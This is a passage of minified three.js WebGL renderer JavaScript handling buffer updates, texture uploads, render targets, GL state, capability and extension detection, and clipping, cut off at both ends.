format: Float64Array\"):t instanceof Uint16Array?k=a.UNSIGNED_SHORT:\nt instanceof Int16Array?k=a.SHORT:t instanceof Uint32Array?k=a.UNSIGNED_INT:t instanceof Int32Array?k=a.INT:t instanceof Int8Array?k=a.BYTE:t instanceof Uint8Array&&(k=a.UNSIGNED_BYTE);m.bytesPerElement=t.BYTES_PER_ELEMENT;m.type=k;m.version=e.version;e.onUploadCallback()}else m.version!==e.version&&(a.bindBuffer(d,m.__webglBuffer),!1===e.dynamic?a.bufferData(d,e.array,a.STATIC_DRAW):-1===e.updateRange.count?a.bufferSubData(d,0,e.array):0===e.updateRange.count?console.error(\"THREE.WebGLObjects.updateBuffer: dynamic THREE.BufferAttribute marked as needsUpdate but updateRange.count is 0, ensure you are using set methods or updating manually.\"):\n(a.bufferSubData(d,e.updateRange.offset*e.array.BYTES_PER_ELEMENT,e.array.subarray(e.updateRange.offset,e.updateRange.offset+e.updateRange.count)),e.updateRange.count=0),m.version=e.version)}var e=new Nf(a,b,c);return{getAttributeBuffer:function(a){return a.isInterleavedBufferAttribute?b.get(a.data).__webglBuffer:b.get(a).__webglBuffer},getAttributeProperties:function(a){return a.isInterleavedBufferAttribute?b.get(a.data):b.get(a)},getWireframeAttribute:function(c){var e=b.get(c);if(void 0!==e.wireframe)return e.wireframe;\nvar h=[],m=c.index;c=c.attributes;if(null!==m){m=m.array;c=0;for(var k=m.length;c<k;c+=3){var t=m[c+0],p=m[c+1],n=m[c+2];h.push(t,p,p,n,n,t)}}else for(m=c.position.array,c=0,k=m.length/3-1;c<k;c+=3)t=c+0,p=c+1,n=c+2,h.push(t,p,p,n,n,t);h=new (65535<Ud(h)?jb:ib)(h,1);d(h,a.ELEMENT_ARRAY_BUFFER);return e.wireframe=h},update:function(b){var c=e.get(b);b.geometry.isGeometry&&c.updateFromObject(b);b=c.index;var h=c.attributes;null!==b&&d(b,a.ELEMENT_ARRAY_BUFFER);for(var m in h)d(h[m],a.ARRAY_BUFFER);\nb=c.morphAttributes;for(m in b)for(var h=b[m],k=0,t=h.length;k<t;k++)d(h[k],a.ARRAY_BUFFER);return c}}}function Pf(a,b,c,d,e,f,g){function h(a,b){if(a.width>b||a.height>b){var c=b/Math.max(a.width,a.height),d=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");d.width=Math.floor(a.width*c);d.height=Math.floor(a.height*c);d.getContext(\"2d\").drawImage(a,0,0,a.width,a.height,0,0,d.width,d.height);console.warn(\"THREE.WebGLRenderer: image is too big (\"+a.width+\"x\"+a.height+\"). Resized to \"+\nd.width+\"x\"+d.height,a);return d}return a}function m(a){return N.isPowerOfTwo(a.width)&&N.isPowerOfTwo(a.height)}function k(b){return 1003===b||1004===b||1005===b?a.NEAREST:a.LINEAR}function t(b){b=b.target;b.removeEventListener(\"dispose\",t);a:{var c=d.get(b);if(b.image&&c.__image__webglTextureCube)a.deleteTexture(c.__image__webglTextureCube);else{if(void 0===c.__webglInit)break a;a.deleteTexture(c.__webglTexture)}d[\"delete\"](b)}q.textures--}function p(b){b=b.target;b.removeEventListener(\"dispose\",\np);var c=d.get(b),e=d.get(b.texture);if(b){void 0!==e.__webglTexture&&a.deleteTexture(e.__webglTexture);b.depthTexture&&b.depthTexture.dispose();if(b.isWebGLRenderTargetCube)for(e=0;6>e;e++)a.deleteFramebuffer(c.__webglFramebuffer[e]),c.__webglDepthbuffer&&a.deleteRenderbuffer(c.__webglDepthbuffer[e]);else a.deleteFramebuffer(c.__webglFramebuffer),c.__webglDepthbuffer&&a.deleteRenderbuffer(c.__webglDepthbuffer);d[\"delete\"](b.texture);d[\"delete\"](b)}q.textures--}function n(b,g){var k=d.get(b);if(0<\nb.version&&k.__version!==b.version){var n=b.image;if(void 0===n)console.warn(\"THREE.WebGLRenderer: Texture marked for update but image is undefined\",b);else if(!1===n.complete)console.warn(\"THREE.WebGLRenderer: Texture marked for update but image is incomplete\",b);else{void 0===k.__webglInit&&(k.__webglInit=!0,b.addEventListener(\"dispose\",t),k.__webglTexture=a.createTexture(),q.textures++);c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_2D,k.__webglTexture);a.pixelStorei(a.UNPACK_FLIP_Y_WEBGL,\nb.flipY);a.pixelStorei(a.UNPACK_PREMULTIPLY_ALPHA_WEBGL,b.premultiplyAlpha);a.pixelStorei(a.UNPACK_ALIGNMENT,b.unpackAlignment);var p=h(b.image,e.maxTextureSize);if((1001!==b.wrapS||1001!==b.wrapT||1003!==b.minFilter&&1006!==b.minFilter)&&!1===m(p))if(n=p,n instanceof HTMLImageElement||n instanceof HTMLCanvasElement){var l=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");l.width=N.nearestPowerOfTwo(n.width);l.height=N.nearestPowerOfTwo(n.height);l.getContext(\"2d\").drawImage(n,0,0,\nl.width,l.height);console.warn(\"THREE.WebGLRenderer: image is not power of two (\"+n.width+\"x\"+n.height+\"). Resized to \"+l.width+\"x\"+l.height,n);p=l}else p=n;var n=m(p),l=f(b.format),G=f(b.type);u(a.TEXTURE_2D,b,n);var r=b.mipmaps;if(b.isDepthTexture){r=a.DEPTH_COMPONENT;if(1015===b.type){if(!w)throw Error(\"Float Depth Texture only supported in WebGL2.0\");r=a.DEPTH_COMPONENT32F}else w&&(r=a.DEPTH_COMPONENT16);1026===b.format&&r===a.DEPTH_COMPONENT&&1012!==b.type&&1014!==b.type&&(console.warn(\"THREE.WebGLRenderer: Use UnsignedShortType or UnsignedIntType for DepthFormat DepthTexture.\"),\nb.type=1012,G=f(b.type));1027===b.format&&(r=a.DEPTH_STENCIL,1020!==b.type&&(console.warn(\"THREE.WebGLRenderer: Use UnsignedInt248Type for DepthStencilFormat DepthTexture.\"),b.type=1020,G=f(b.type)));c.texImage2D(a.TEXTURE_2D,0,r,p.width,p.height,0,l,G,null)}else if(b.isDataTexture)if(0<r.length&&n){for(var H=0,aa=r.length;H<aa;H++)p=r[H],c.texImage2D(a.TEXTURE_2D,H,l,p.width,p.height,0,l,G,p.data);b.generateMipmaps=!1}else c.texImage2D(a.TEXTURE_2D,0,l,p.width,p.height,0,l,G,p.data);else if(b.isCompressedTexture)for(H=\n0,aa=r.length;H<aa;H++)p=r[H],1023!==b.format&&1022!==b.format?-1<c.getCompressedTextureFormats().indexOf(l)?c.compressedTexImage2D(a.TEXTURE_2D,H,l,p.width,p.height,0,p.data):console.warn(\"THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()\"):c.texImage2D(a.TEXTURE_2D,H,l,p.width,p.height,0,l,G,p.data);else if(0<r.length&&n){H=0;for(aa=r.length;H<aa;H++)p=r[H],c.texImage2D(a.TEXTURE_2D,H,l,l,G,p);b.generateMipmaps=!1}else c.texImage2D(a.TEXTURE_2D,0,l,l,\nG,p);b.generateMipmaps&&n&&a.generateMipmap(a.TEXTURE_2D);k.__version=b.version;if(b.onUpdate)b.onUpdate(b);return}}c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_2D,k.__webglTexture)}function u(c,g,h){h?(a.texParameteri(c,a.TEXTURE_WRAP_S,f(g.wrapS)),a.texParameteri(c,a.TEXTURE_WRAP_T,f(g.wrapT)),a.texParameteri(c,a.TEXTURE_MAG_FILTER,f(g.magFilter)),a.texParameteri(c,a.TEXTURE_MIN_FILTER,f(g.minFilter))):(a.texParameteri(c,a.TEXTURE_WRAP_S,a.CLAMP_TO_EDGE),a.texParameteri(c,a.TEXTURE_WRAP_T,\na.CLAMP_TO_EDGE),1001===g.wrapS&&1001===g.wrapT||console.warn(\"THREE.WebGLRenderer: Texture is not power of two. Texture.wrapS and Texture.wrapT should be set to THREE.ClampToEdgeWrapping.\",g),a.texParameteri(c,a.TEXTURE_MAG_FILTER,k(g.magFilter)),a.texParameteri(c,a.TEXTURE_MIN_FILTER,k(g.minFilter)),1003!==g.minFilter&&1006!==g.minFilter&&console.warn(\"THREE.WebGLRenderer: Texture is not power of two. Texture.minFilter should be set to THREE.NearestFilter or THREE.LinearFilter.\",g));!(h=b.get(\"EXT_texture_filter_anisotropic\"))||\n1015===g.type&&null===b.get(\"OES_texture_float_linear\")||1016===g.type&&null===b.get(\"OES_texture_half_float_linear\")||!(1<g.anisotropy||d.get(g).__currentAnisotropy)||(a.texParameterf(c,h.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(g.anisotropy,e.getMaxAnisotropy())),d.get(g).__currentAnisotropy=g.anisotropy)}function l(b,e,g,h){var m=f(e.texture.format),k=f(e.texture.type);c.texImage2D(h,0,m,e.width,e.height,0,m,k,null);a.bindFramebuffer(a.FRAMEBUFFER,b);a.framebufferTexture2D(a.FRAMEBUFFER,g,h,d.get(e.texture).__webglTexture,\n0);a.bindFramebuffer(a.FRAMEBUFFER,null)}function r(b,c){a.bindRenderbuffer(a.RENDERBUFFER,b);c.depthBuffer&&!c.stencilBuffer?(a.renderbufferStorage(a.RENDERBUFFER,a.DEPTH_COMPONENT16,c.width,c.height),a.framebufferRenderbuffer(a.FRAMEBUFFER,a.DEPTH_ATTACHMENT,a.RENDERBUFFER,b)):c.depthBuffer&&c.stencilBuffer?(a.renderbufferStorage(a.RENDERBUFFER,a.DEPTH_STENCIL,c.width,c.height),a.framebufferRenderbuffer(a.FRAMEBUFFER,a.DEPTH_STENCIL_ATTACHMENT,a.RENDERBUFFER,b)):a.renderbufferStorage(a.RENDERBUFFER,\na.RGBA4,c.width,c.height);a.bindRenderbuffer(a.RENDERBUFFER,null)}var q=g.memory,w=\"undefined\"!==typeof WebGL2RenderingContext&&a instanceof WebGL2RenderingContext;this.setTexture2D=n;this.setTextureCube=function(b,g){var k=d.get(b);if(6===b.image.length)if(0<b.version&&k.__version!==b.version){k.__image__webglTextureCube||(b.addEventListener(\"dispose\",t),k.__image__webglTextureCube=a.createTexture(),q.textures++);c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_CUBE_MAP,k.__image__webglTextureCube);\na.pixelStorei(a.UNPACK_FLIP_Y_WEBGL,b.flipY);for(var n=b&&b.isCompressedTexture,p=b.image[0]&&b.image[0].isDataTexture,l=[],r=0;6>r;r++)l[r]=n||p?p?b.image[r].image:b.image[r]:h(b.image[r],e.maxCubemapSize);var G=m(l[0]),w=f(b.format),aa=f(b.type);u(a.TEXTURE_CUBE_MAP,b,G);for(r=0;6>r;r++)if(n)for(var x,D=l[r].mipmaps,z=0,Q=D.length;z<Q;z++)x=D[z],1023!==b.format&&1022!==b.format?-1<c.getCompressedTextureFormats().indexOf(w)?c.compressedTexImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+r,z,w,x.width,x.height,\n0,x.data):console.warn(\"THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .setTextureCube()\"):c.texImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+r,z,w,x.width,x.height,0,w,aa,x.data);else p?c.texImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+r,0,w,l[r].width,l[r].height,0,w,aa,l[r].data):c.texImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+r,0,w,w,aa,l[r]);b.generateMipmaps&&G&&a.generateMipmap(a.TEXTURE_CUBE_MAP);k.__version=b.version;if(b.onUpdate)b.onUpdate(b)}else c.activeTexture(a.TEXTURE0+\ng),c.bindTexture(a.TEXTURE_CUBE_MAP,k.__image__webglTextureCube)};this.setTextureCubeDynamic=function(b,e){c.activeTexture(a.TEXTURE0+e);c.bindTexture(a.TEXTURE_CUBE_MAP,d.get(b).__webglTexture)};this.setupRenderTarget=function(b){var e=d.get(b),f=d.get(b.texture);b.addEventListener(\"dispose\",p);f.__webglTexture=a.createTexture();q.textures++;var g=!0===b.isWebGLRenderTargetCube,h=m(b);if(g){e.__webglFramebuffer=[];for(var k=0;6>k;k++)e.__webglFramebuffer[k]=a.createFramebuffer()}else e.__webglFramebuffer=\na.createFramebuffer();if(g){c.bindTexture(a.TEXTURE_CUBE_MAP,f.__webglTexture);u(a.TEXTURE_CUBE_MAP,b.texture,h);for(k=0;6>k;k++)l(e.__webglFramebuffer[k],b,a.COLOR_ATTACHMENT0,a.TEXTURE_CUBE_MAP_POSITIVE_X+k);b.texture.generateMipmaps&&h&&a.generateMipmap(a.TEXTURE_CUBE_MAP);c.bindTexture(a.TEXTURE_CUBE_MAP,null)}else c.bindTexture(a.TEXTURE_2D,f.__webglTexture),u(a.TEXTURE_2D,b.texture,h),l(e.__webglFramebuffer,b,a.COLOR_ATTACHMENT0,a.TEXTURE_2D),b.texture.generateMipmaps&&h&&a.generateMipmap(a.TEXTURE_2D),\nc.bindTexture(a.TEXTURE_2D,null);if(b.depthBuffer){e=d.get(b);f=!0===b.isWebGLRenderTargetCube;if(b.depthTexture){if(f)throw Error(\"target.depthTexture not supported in Cube render targets\");if(b&&b.isWebGLRenderTargetCube)throw Error(\"Depth Texture with cube render targets is not supported!\");a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer);if(!b.depthTexture||!b.depthTexture.isDepthTexture)throw Error(\"renderTarget.depthTexture must be an instance of THREE.DepthTexture\");d.get(b.depthTexture).__webglTexture&&\nb.depthTexture.image.width===b.width&&b.depthTexture.image.height===b.height||(b.depthTexture.image.width=b.width,b.depthTexture.image.height=b.height,b.depthTexture.needsUpdate=!0);n(b.depthTexture,0);e=d.get(b.depthTexture).__webglTexture;if(1026===b.depthTexture.format)a.framebufferTexture2D(a.FRAMEBUFFER,a.DEPTH_ATTACHMENT,a.TEXTURE_2D,e,0);else if(1027===b.depthTexture.format)a.framebufferTexture2D(a.FRAMEBUFFER,a.DEPTH_STENCIL_ATTACHMENT,a.TEXTURE_2D,e,0);else throw Error(\"Unknown depthTexture format\");\n}else if(f)for(e.__webglDepthbuffer=[],f=0;6>f;f++)a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer[f]),e.__webglDepthbuffer[f]=a.createRenderbuffer(),r(e.__webglDepthbuffer[f],b);else a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer),e.__webglDepthbuffer=a.createRenderbuffer(),r(e.__webglDepthbuffer,b);a.bindFramebuffer(a.FRAMEBUFFER,null)}};this.updateRenderTargetMipmap=function(b){var e=b.texture;e.generateMipmaps&&m(b)&&1003!==e.minFilter&&1006!==e.minFilter&&(b=b&&b.isWebGLRenderTargetCube?\na.TEXTURE_CUBE_MAP:a.TEXTURE_2D,e=d.get(e).__webglTexture,c.bindTexture(b,e),a.generateMipmap(b),c.bindTexture(b,null))}}function Qf(){var a={};return{get:function(b){b=b.uuid;var c=a[b];void 0===c&&(c={},a[b]=c);return c},\"delete\":function(b){delete a[b.uuid]},clear:function(){a={}}}}function Rf(a,b,c){function d(b,c,d){var e=new Uint8Array(4),f=a.createTexture();a.bindTexture(b,f);a.texParameteri(b,a.TEXTURE_MIN_FILTER,a.NEAREST);a.texParameteri(b,a.TEXTURE_MAG_FILTER,a.NEAREST);for(b=0;b<d;b++)a.texImage2D(c+\nb,0,a.RGBA,1,1,0,a.RGBA,a.UNSIGNED_BYTE,e);return f}function e(b){!0!==y[b]&&(a.enable(b),y[b]=!0)}function f(b){!1!==y[b]&&(a.disable(b),y[b]=!1)}function g(b,d,g,h,m,k,n,t){0!==b?e(a.BLEND):f(a.BLEND);if(b!==v||t!==x)2===b?t?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ONE,a.ONE,a.ONE,a.ONE)):(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.SRC_ALPHA,a.ONE)):3===b?t?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ZERO,a.ZERO,a.ONE_MINUS_SRC_COLOR,a.ONE_MINUS_SRC_ALPHA)):\n(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.ZERO,a.ONE_MINUS_SRC_COLOR)):4===b?t?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ZERO,a.SRC_COLOR,a.ZERO,a.SRC_ALPHA)):(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.ZERO,a.SRC_COLOR)):t?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ONE,a.ONE_MINUS_SRC_ALPHA,a.ONE,a.ONE_MINUS_SRC_ALPHA)):(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.SRC_ALPHA,a.ONE_MINUS_SRC_ALPHA,a.ONE,a.ONE_MINUS_SRC_ALPHA)),\nv=b,x=t;if(5===b){m=m||d;k=k||g;n=n||h;if(d!==E||m!==F)a.blendEquationSeparate(c(d),c(m)),E=d,F=m;if(g!==L||h!==C||k!==da||n!==H)a.blendFuncSeparate(c(g),c(h),c(k),c(n)),L=g,C=h,da=k,H=n}else H=da=F=C=L=E=null}function h(a){n.setFunc(a)}function m(b){D!==b&&(b?a.frontFace(a.CW):a.frontFace(a.CCW),D=b)}function k(b){0!==b?(e(a.CULL_FACE),b!==z&&(1===b?a.cullFace(a.BACK):2===b?a.cullFace(a.FRONT):a.cullFace(a.FRONT_AND_BACK))):f(a.CULL_FACE);z=b}function t(b){void 0===b&&(b=a.TEXTURE0+P-1);W!==b&&(a.activeTexture(b),\nW=b)}var p=new function(){var b=!1,c=new fa,d=null,e=new fa;return{setMask:function(c){d===c||b||(a.colorMask(c,c,c,c),d=c)},setLocked:function(a){b=a},setClear:function(b,d,f,g,h){!0===h&&(b*=g,d*=g,f*=g);c.set(b,d,f,g);!1===e.equals(c)&&(a.clearColor(b,d,f,g),e.copy(c))},reset:function(){b=!1;d=null;e.set(0,0,0,1)}}},n=new function(){var b=!1,c=null,d=null,g=null;return{setTest:function(b){b?e(a.DEPTH_TEST):f(a.DEPTH_TEST)},setMask:function(d){c===d||b||(a.depthMask(d),c=d)},setFunc:function(b){if(d!==\nb){if(b)switch(b){case 0:a.depthFunc(a.NEVER);break;case 1:a.depthFunc(a.ALWAYS);break;case 2:a.depthFunc(a.LESS);break;case 3:a.depthFunc(a.LEQUAL);break;case 4:a.depthFunc(a.EQUAL);break;case 5:a.depthFunc(a.GEQUAL);break;case 6:a.depthFunc(a.GREATER);break;case 7:a.depthFunc(a.NOTEQUAL);break;default:a.depthFunc(a.LEQUAL)}else a.depthFunc(a.LEQUAL);d=b}},setLocked:function(a){b=a},setClear:function(b){g!==b&&(a.clearDepth(b),g=b)},reset:function(){b=!1;g=d=c=null}}},u=new function(){var b=!1,c=\nnull,d=null,g=null,h=null,m=null,k=null,n=null,t=null;return{setTest:function(b){b?e(a.STENCIL_TEST):f(a.STENCIL_TEST)},setMask:function(d){c===d||b||(a.stencilMask(d),c=d)},setFunc:function(b,c,e){if(d!==b||g!==c||h!==e)a.stencilFunc(b,c,e),d=b,g=c,h=e},setOp:function(b,c,d){if(m!==b||k!==c||n!==d)a.stencilOp(b,c,d),m=b,k=c,n=d},setLocked:function(a){b=a},setClear:function(b){t!==b&&(a.clearStencil(b),t=b)},reset:function(){b=!1;t=n=k=m=h=g=d=c=null}}},l=a.getParameter(a.MAX_VERTEX_ATTRIBS),r=new Uint8Array(l),\nq=new Uint8Array(l),w=new Uint8Array(l),y={},K=null,v=null,E=null,L=null,C=null,F=null,da=null,H=null,x=!1,D=null,z=null,J=null,Q=null,M=null,O=null,P=a.getParameter(a.MAX_TEXTURE_IMAGE_UNITS),l=parseFloat(/^WebGL\\ ([0-9])/.exec(a.getParameter(a.VERSION))[1]),I=1<=parseFloat(l),W=null,S={},R=new fa,T=new fa,N={};N[a.TEXTURE_2D]=d(a.TEXTURE_2D,a.TEXTURE_2D,1);N[a.TEXTURE_CUBE_MAP]=d(a.TEXTURE_CUBE_MAP,a.TEXTURE_CUBE_MAP_POSITIVE_X,6);return{buffers:{color:p,depth:n,stencil:u},init:function(){p.setClear(0,\n0,0,1);n.setClear(1);u.setClear(0);e(a.DEPTH_TEST);h(3);m(!1);k(1);e(a.CULL_FACE);e(a.BLEND);g(1)},initAttributes:function(){for(var a=0,b=r.length;a<b;a++)r[a]=0},enableAttribute:function(c){r[c]=1;0===q[c]&&(a.enableVertexAttribArray(c),q[c]=1);0!==w[c]&&(b.get(\"ANGLE_instanced_arrays\").vertexAttribDivisorANGLE(c,0),w[c]=0)},enableAttributeAndDivisor:function(b,c,d){r[b]=1;0===q[b]&&(a.enableVertexAttribArray(b),q[b]=1);w[b]!==c&&(d.vertexAttribDivisorANGLE(b,c),w[b]=c)},disableUnusedAttributes:function(){for(var b=\n0,c=q.length;b!==c;++b)q[b]!==r[b]&&(a.disableVertexAttribArray(b),q[b]=0)},enable:e,disable:f,getCompressedTextureFormats:function(){if(null===K&&(K=[],b.get(\"WEBGL_compressed_texture_pvrtc\")||b.get(\"WEBGL_compressed_texture_s3tc\")||b.get(\"WEBGL_compressed_texture_etc1\")))for(var c=a.getParameter(a.COMPRESSED_TEXTURE_FORMATS),d=0;d<c.length;d++)K.push(c[d]);return K},setBlending:g,setColorWrite:function(a){p.setMask(a)},setDepthTest:function(a){n.setTest(a)},setDepthWrite:function(a){n.setMask(a)},\nsetDepthFunc:h,setStencilTest:function(a){u.setTest(a)},setStencilWrite:function(a){u.setMask(a)},setStencilFunc:function(a,b,c){u.setFunc(a,b,c)},setStencilOp:function(a,b,c){u.setOp(a,b,c)},setFlipSided:m,setCullFace:k,setLineWidth:function(b){b!==J&&(I&&a.lineWidth(b),J=b)},setPolygonOffset:function(b,c,d){if(b){if(e(a.POLYGON_OFFSET_FILL),Q!==c||M!==d)a.polygonOffset(c,d),Q=c,M=d}else f(a.POLYGON_OFFSET_FILL)},getScissorTest:function(){return O},setScissorTest:function(b){(O=b)?e(a.SCISSOR_TEST):\nf(a.SCISSOR_TEST)},activeTexture:t,bindTexture:function(b,c){null===W&&t();var d=S[W];void 0===d&&(d={type:void 0,texture:void 0},S[W]=d);if(d.type!==b||d.texture!==c)a.bindTexture(b,c||N[b]),d.type=b,d.texture=c},compressedTexImage2D:function(){try{a.compressedTexImage2D.apply(a,arguments)}catch(b){console.error(b)}},texImage2D:function(){try{a.texImage2D.apply(a,arguments)}catch(b){console.error(b)}},scissor:function(b){!1===R.equals(b)&&(a.scissor(b.x,b.y,b.z,b.w),R.copy(b))},viewport:function(b){!1===\nT.equals(b)&&(a.viewport(b.x,b.y,b.z,b.w),T.copy(b))},reset:function(){for(var b=0;b<q.length;b++)1===q[b]&&(a.disableVertexAttribArray(b),q[b]=0);y={};W=K=null;S={};z=D=v=null;p.reset();n.reset();u.reset()}}}function Sf(a,b,c){function d(b){if(\"highp\"===b){if(0<a.getShaderPrecisionFormat(a.VERTEX_SHADER,a.HIGH_FLOAT).precision&&0<a.getShaderPrecisionFormat(a.FRAGMENT_SHADER,a.HIGH_FLOAT).precision)return\"highp\";b=\"mediump\"}return\"mediump\"===b&&0<a.getShaderPrecisionFormat(a.VERTEX_SHADER,a.MEDIUM_FLOAT).precision&&\n0<a.getShaderPrecisionFormat(a.FRAGMENT_SHADER,a.MEDIUM_FLOAT).precision?\"mediump\":\"lowp\"}var e,f=void 0!==c.precision?c.precision:\"highp\",g=d(f);g!==f&&(console.warn(\"THREE.WebGLRenderer:\",f,\"not supported, using\",g,\"instead.\"),f=g);c=!0===c.logarithmicDepthBuffer&&!!b.get(\"EXT_frag_depth\");var g=a.getParameter(a.MAX_TEXTURE_IMAGE_UNITS),h=a.getParameter(a.MAX_VERTEX_TEXTURE_IMAGE_UNITS),m=a.getParameter(a.MAX_TEXTURE_SIZE),k=a.getParameter(a.MAX_CUBE_MAP_TEXTURE_SIZE),t=a.getParameter(a.MAX_VERTEX_ATTRIBS),\np=a.getParameter(a.MAX_VERTEX_UNIFORM_VECTORS),n=a.getParameter(a.MAX_VARYING_VECTORS),u=a.getParameter(a.MAX_FRAGMENT_UNIFORM_VECTORS),l=0<h,r=!!b.get(\"OES_texture_float\");return{getMaxAnisotropy:function(){if(void 0!==e)return e;var c=b.get(\"EXT_texture_filter_anisotropic\");return e=null!==c?a.getParameter(c.MAX_TEXTURE_MAX_ANISOTROPY_EXT):0},getMaxPrecision:d,precision:f,logarithmicDepthBuffer:c,maxTextures:g,maxVertexTextures:h,maxTextureSize:m,maxCubemapSize:k,maxAttributes:t,maxVertexUniforms:p,\nmaxVaryings:n,maxFragmentUniforms:u,vertexTextures:l,floatFragmentTextures:r,floatVertexTextures:l&&r}}function Tf(a){var b={};return{get:function(c){if(void 0!==b[c])return b[c];var d;switch(c){case \"WEBGL_depth_texture\":d=a.getExtension(\"WEBGL_depth_texture\")||a.getExtension(\"MOZ_WEBGL_depth_texture\")||a.getExtension(\"WEBKIT_WEBGL_depth_texture\");break;case \"EXT_texture_filter_anisotropic\":d=a.getExtension(\"EXT_texture_filter_anisotropic\")||a.getExtension(\"MOZ_EXT_texture_filter_anisotropic\")||\na.getExtension(\"WEBKIT_EXT_texture_filter_anisotropic\");break;case \"WEBGL_compressed_texture_s3tc\":d=a.getExtension(\"WEBGL_compressed_texture_s3tc\")||a.getExtension(\"MOZ_WEBGL_compressed_texture_s3tc\")||a.getExtension(\"WEBKIT_WEBGL_compressed_texture_s3tc\");break;case \"WEBGL_compressed_texture_pvrtc\":d=a.getExtension(\"WEBGL_compressed_texture_pvrtc\")||a.getExtension(\"WEBKIT_WEBGL_compressed_texture_pvrtc\");break;case \"WEBGL_compressed_texture_etc1\":d=a.getExtension(\"WEBGL_compressed_texture_etc1\");\nbreak;default:d=a.getExtension(c)}null===d&&console.warn(\"THREE.WebGLRenderer: \"+c+\" extension not supported.\");return b[c]=d}}}function Uf(){function a(){k.value!==d&&(k.value=d,k.needsUpdate=0<e);c.numPlanes=e;c.numIntersection=0}function b(a,b,d,e){var f=null!==a?a.length:0,g=null;if(0!==f){g=k.value;if(!0!==e||null===g){e=d+4*f;b=b.matrixWorldInverse;m.getNormalMatrix(b);if(null===g||g.length<e)g=new Float32Array(e);for(e=0;e!==f;++e,d+=4)h.copy(a[e]).applyMatrix4(b,m),h.normal.toArray(g,d),g[d+\n3]=h.constant}k.value=g;k.needsUpdate=!0}c.numPlanes=f;return g}var c=this,d=null,e=0,f=!1,g=!1,h=new la,m=new ya,k={value:null,needsUpdate:!1};this.uniform=k;this.numIntersection=this.numPlanes=0;this.init=function(a,c,g){var h=0!==a.length||c||0!==e||f;f=c;d=b(a,g,0);e=a.length;return h};this.beginShadows=function(){g=!0;b(null)};this.endShadows=function(){g=!1;a()};this.setState=function(c,h,m,l,G,r){if(!f||null===c||0===c.length||g&&!m)g?b(null):a();else{m=g?0:e;var q=4*m,w=G.clippingState||null;\nk.value=w;w=b(c,l,q,r);for(c=0;c!==q;++c)w[c]=d[c];G.clippingState=w;this.numIntersection=h?this.numPlanes:0;this.numPlanes+=m}}}function Yd(a){function b(){Y.init();Y.scissor(X.copy(ga).multiplyScalar(Ra));Y.viewport(Z.copy(ia).multiplyScalar(Ra));Y.buffers.color.setClear(Ea.r,Ea.g,Ea.b,gb,F)}function c(){U=wa=null;V=\"\";R=-1;Y.reset()}function d(a){a.preventDefault();c();b();ha.clear()}function e(a){a=a.target;a.removeEventListener(\"dispose\",e);f(a);ha[\"delete\"](a)}function f(a){var b=ha.get(a).program;\na.program=void 0;void 0!==b&&ya.releaseProgram(b)}function g(a,b){return Math.abs(b[0])-Math.abs(a[0])}function h(a,b){return a.object.renderOrder!==b.object.renderOrder?a.object.renderOrder-b.object.renderOrder:a.material.program&&b.material.program&&a.material.program!==b.material.program?a.material.program.id-b.material.program.id:a.material.id!==b.material.id?a.material.id-b.material.id:a.z!==b.z?a.z-b.z:a.id-b.id}function m(a,b){return a.object.renderOrder!==b.object.renderOrder?a.object.renderOrder-\nb.object.renderOrder:a.z!==b.z?b.z-a.z:a.id-b.id}function k(a,b,c,d,e){var f;c.transparent?(d=z,f=++T):(d=aa,f=++D);f=d[f];void 0!==f?(f.id=a.id,f.object=a,f.geometry=b,f.material=c,f.z=Ga.z,f.group=e):(f={id:a.id,object:a,geometry:b,material:c,z:Ga.z,group:e},d.push(f))}function t(a){if(!ma.intersectsSphere(a))return!1;var b=ca.numPlanes;if(0===b)return!0;var c=P.clippingPlanes,d=a.center;a=-a.radius;var e=0;do if(c[e].distanceToPoint(d)<a)return!1;while(++e!==b);return!0}function p(a,b){if(!1!==\na.visible){if(0!==(a.layers.mask&b.layers.mask))if(a.isLight)H.push(a);else if(a.isSprite){var c;(c=!1===a.frustumCulled)||(na.center.set(0,0,0),na.radius=.7071067811865476,na.applyMatrix4(a.matrixWorld),c=!0===t(na));c&&M.push(a)}else if(a.isLensFlare)O.push(a);else if(a.isImmediateRenderObject)!0===P.sortObjects&&(Ga.setFromMatrixPosition(a.matrixWorld),Ga.applyMatrix4(ua)),k(a,null,a.material,Ga.z,null);else if(a.isMesh||a.isLine||a.isPoints)if(a.isSkinnedMesh&&a.skeleton.update(),(c=!1===a.frustumCulled)||\n(c=a.geometry,null===c.boundingSphere&&c.computeBoundingSphere(),na.copy(c.boundingSphere).applyMatrix4(a.matrixWorld),c=!0===t(na)),c){var d=a.material;if(!0===d.visible)if(!0===P.sortObjects&&(Ga.setFromMatrixPosition(a.matrixWorld),Ga.applyMatrix4(ua)),c=qa.update(a),d.isMultiMaterial)for(var e=c.groups,f=d.materials,d=0,g=e.length;d<g;d++){var h=e[d],m=f[h.materialIndex];!0===m.visible&&k(a,c,m,Ga.z,h)}else k(a,c,d,Ga.z,null)}c=a.children;d=0;for(g=c.length;d<g;d++)p(c[d],b)}}function n(a,b,c,\nd){for(var e=0,f=a.length;e<f;e++){var g=a[e],h=g.object,m=g.geometry,k=void 